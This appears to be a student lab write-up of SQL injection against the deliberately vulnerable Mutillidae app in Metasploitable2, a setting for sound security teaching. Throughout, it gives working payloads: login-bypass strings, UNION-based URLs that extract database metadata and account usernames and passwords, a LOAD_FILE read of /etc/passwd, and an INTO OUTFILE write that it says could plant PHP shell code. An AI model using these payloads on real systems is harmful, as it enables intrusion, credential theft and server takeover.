# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/409909fb-2197-49bd-93d8-bb506bc54283)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/1a3fbcf0-39c5-4e0a-92f3-9c1951083433)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/76e4baa1-84f7-4e87-9f0d-8baf6dba1b3f)

Click on the menu Login/Register and register for an account

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/cb9a4dd4-565a-4e15-beb9-79ae04ce7a2b)

Click on the link “Please register here”

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/9121fdb2-556e-4bb8-98dc-fa6195350dcf)

Click on “Create Account” to display the following page:

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/b223ba89-85a2-4754-837f-6f58459cc171)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/f220f03e-a536-4e80-a504-d56546fb3dd5)

Click “Login”. The logged in page will show as below:

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/42cece24-310a-4f14-8be3-4678ea73969c)

Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/704c8c56-d5b3-4e77-a352-de26deae670d)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/780410e0-3b89-49c4-bc3d-6da5b3f8652e)

# Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/3612e9e4-4aee-4fbd-9298-ace4b14156c7)

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/d6a46e71-c76c-4a5c-99a7-8d3a859c1b8d)

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/ba2ceedd-2ee3-40c5-a524-d168b010cea3)

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/7c99dfe2-47b0-48cd-bd19-1406830047e8)

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/eec65a57-e48c-4e88-8fa3-9daf216d5e31)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/e8325486-52f6-4740-a98a-abf2c69f6b3e)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/be692ffd-cfc7-4ef3-8923-c9f217760f96)


After adding the order by 6 into the existing url , the following error statement will be obtained:


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/67024c1d-615a-407b-9cf1-05fa3ed88bdb)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/fcd2e903-8d10-46f6-b07b-1ea4cb691543)


As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/f5962790-a92b-47ce-b659-cf91f32b9880)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/e7e36c7a-65dc-47da-bd81-12c4d9ec37da)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.



![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/5ff8f61c-1e08-4aa8-96d5-39f113c82b12)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database. http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/87954deb-b5c8-4bfb-aaba-9f3aeb1fa73c)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/88748b10-457c-4ee6-ac3e-426618c9eaea)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.



![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/72a9d6aa-0255-4eda-b5ec-268a405c4265)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/e7b8e205-c244-4eaf-b401-4546e157751e)



Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/1a59cc53-bc99-4bf0-b079-2547b57d3331)

# Reading and writing files on the web-server:

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Irenejecinthamerlin/sqlinjection/assets/128350225/25cd2327-e091-4566-b2ed-48491fa6d4af)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
